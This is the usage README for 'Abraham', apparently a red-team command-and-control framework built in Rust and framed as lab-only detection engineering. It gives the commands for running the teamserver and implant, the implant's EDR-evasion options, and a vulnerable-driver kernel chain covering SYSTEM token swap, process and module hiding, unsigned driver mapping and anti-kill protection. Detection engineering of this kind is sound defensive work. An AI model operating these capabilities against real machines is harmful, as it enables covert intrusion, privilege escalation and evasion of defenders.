# Abraham — Usage

Binaries are built from the workspace root:

```
cargo build --release
```

## 1. Start the teamserver

```
target\release\abraham-server.exe [--listen 0.0.0.0:8443] [--mgmt 127.0.0.1:9000] [--key server.key] [--profile profiles\default.yaml] [--tls-cert server-cert.pem] [--tls-key server-tls-key.pem]
```

On first run the server generates its Ed25519 identity, persists the seed in
`server.key` and writes the public key (hex) to `server.pub`, and generates a
self-signed TLS certificate (PEM pair). Startup output prints both the pinned
identity (hex) and the TLS certificate sha256 pin.

The c2 listener speaks HTTPS: tasking rides inside HTTP/1.1 keep-alive POSTs
within TLS, shaped by the malleable profile (`docs/protocol.md` §8).

## 2. Start the implant (authorized lab machines only)

```
target\release\abraham-implant.exe --server <host:port> --key <contents of server.pub> [--sleep 5] [--jitter 0.25] [--profile <yaml>] [--ua <user-agent>] [--uri <uri>] [--tls-pin <sha256-hex>]
```

The implant connects over TLS, performs the E2E handshake, sends `REGISTER`,
then polls for tasks every `sleep` seconds with `jitter` randomization,
reconnecting on failure. `--tls-pin` (sha256 of the server certificate DER,
printed by the teamserver at startup) pins the outer TLS layer; without it
any certificate is accepted and authenticity relies on the inner Ed25519
handshake.

`--evasion` enables Phase 2 capabilities (comma-separated): `ekko` encrypts
the executable section during each sleep (waitable-timer APC + RC4), `ppid`
spawns shell tasks under a spoofed parent with a fallback to plain spawning
where the OS rejects the attribute (see `docs/detections/abr-t007.md` for
the Windows 11 25H2 findings). Default: all off.

## Module tasks (preferred over shell)

Routine collection runs IN-PROCESS through built-in modules — no
`cmd.exe` child, no process-creation telemetry (ABR-T011; see
`docs/detections/abr-t011.md`). Available: `ps` (process list via
spoofed `NtQuerySystemInformation`), `ls <path>`, `cat <path>` (capped
at 512 KiB; use download for bigger files), `whoami`. Submit with
`module <id> <name> [args...]` in the TUI or
`{"cmd":"module","session":N,"name":"ps","args":""}` on the mgmt port.
Shell tasks remain available but are the noisy option — prefer modules
whenever one fits.

## Driver staging tasks (ABR-T013, lab only)

The DRIVER task drives the kernel-driver staging lifecycle through the
SCM — stage 3.1 of the BYOVD chain, exercised against benign signed
drivers (a copy of `null.sys`) before any vulnerable driver is involved.
`driver <id> load <service> <source> <drop_path>` copies the driver
file, registers a demand-start kernel service on it and starts it;
`driver <id> unload <service> [drop_path]` stops/deregisters the service
and removes the staged file. After a vulnerable driver is loaded,
`driver <id> probe` (ABR-T014) opens the driver's device and proves
arbitrary kernel read (leaks the ntoskrnl base and verifies its MZ
header through the driver; `probe <depth>` runs staged read-only
dry-runs, depths 1-7). `driver <id> elevate` (ABR-T015) proves the
write primitive: SYSTEM token swap, in-process proof and restore.
`driver <id> gate` returns the capability tier verdict;
`driver <id> hide`/`unhide` (ABR-T016) DKOM-unlink the implant from
the global process lists and relink it again with a guarded restore.
`driver <id> call` (ABR-T017) drives the call-capable iqvw64e client
(kernel function calls via the NtAddAtom trampoline) — on current
builds the revoked driver fails to load with a clean error and rich
`driver <id> map [payload.sys]` (ABR-T018) maps an unsigned driver
through the loaded iqvw64e (Nal) client KDMapper-style: pool
allocation, sections, relocations, imports against the live kernel
export tables, then a real `DriverEntry` call. Without a payload path
it maps the builtin in-memory proof driver (magic stamp + import call
+ relocated reference; image freed after entry) and reports
`KERNEL CODE EXECUTION PROVEN`; with a path it maps that `.sys` and
leaves it resident. Requires `driver <id> load iqvw64e <src> <dst>`
first (the loader install is the EID 7045/6 detection anchor — see
`docs/detections/abr-t018.md`). `driver <id> modhide <name.sys>` (ABR-T019) unlinks the loader
module's entry from `nt!PsLoadedModuleList`: driver enumeration
(`NtQuerySystemInformation(SystemModuleInformation)`-based tooling) goes
blind while the image stays mapped and the device keeps answering;
`driver <id> modshow <name.sys>` relinks it (guarded). `driver <id>
protect on` (ABR-T020) copies the SYSTEM process's EPROCESS.Protection
byte onto the implant — termination from every unprotected context
(admin taskkill, Stop-Process) is denied while the session keeps
beaconing; `protect off` restores. Driver `load` is serviceless since
ABR-T019: the service registration and staged file are removed right
after the start (the image and device live on until reboot; the EID
7045 install event remains the irreducible telemetry). CodeIntegrity
telemetry. `driver <id> map <payload.sys>` with OUR payload
(`payloads/abraham-km`, built by `tools/build_payload.sh`) provisions
the ABR-T021 covert channel: a shared NonPagedPool block plus an
injected kernel function table (the payload is freestanding Rust with
zero imports). `driver <id> chan hb` polls the kernel heartbeat,
`chan ping` round-trips a command, `chan protect` arms kernel-side
self-healing anti-kill (re-applied every 2s tick, survives usermode
resets), `chan unprotect` clears it, `chan stop` cancels the payload
timer. `driver <id> elevate` (ABR-T015,
experimental) proves the write primitive: SYSTEM token swap,
in-process proof and restore. Vulnerable-driver binaries are
operator-staged over `upload` -- they never live in this repository.
Requires an elevated session. Every step is
loud by design — see `docs/detections/abr-t013.md` for the EID 7045/6
footprint it cannot avoid.

Four Phase 2 hardenings are always-on, no flag needed: hand-assembled Ekko
routines register unwind metadata (`RtlAddFunctionTable`, ABR-T008) so
stack walks restore their real contexts, SSN resolution falls back to
untouched stubs from a `\KnownDlls\ntdll.dll` view (ABR-T009) when every
local stub and neighbour is hooked, indirect syscalls dispatched by
the implant pivot to a synthetic call stack attributed to system modules
(ABR-T010) unless a user-mode shadow stack is enforced, and the ekko code
home is carved out of a phantom-mapped signed DLL's `.text` (ABR-T012)
instead of `MEM_PRIVATE` memory, with a private-allocation fallback. All
ship with detection guidance in `docs/detections/`.

## 3. Operate

### TUI

```
target\release\abraham-tui.exe [mgmt addr]
```

Commands: `sessions`, `shell <id> <command...>`, `upload <id> <local>
<remote>`, `download <id> <path>`, `sleep <id> <secs> <jitter>`,
`results <id> [limit]`, `exit <id>`. `Esc` quits.

### Scripting (JSON lines on the mgmt port)

```
python tools\mgmt_client.py '{\"cmd\":\"sessions\"}' 9000
python tools\mgmt_client.py '{\"cmd\":\"shell\",\"session\":1,\"command\":\"whoami\"}' 9000
```

Downloads land in `loot/session-<id>/task-<n>.bin`.

## 4. Run the test suite

```
cargo test --workspace
python tools\validate_registry.py
```

## Lab validation (detection engineering)

Before flipping a technique to `experimental` in
`registry/techniques.yaml`, run it against the instrumented lab VM (Sysmon +
ETW), capture the telemetry, and verify the mapped detection fires. Store
evidence under `lab/captures/` (gitignored).
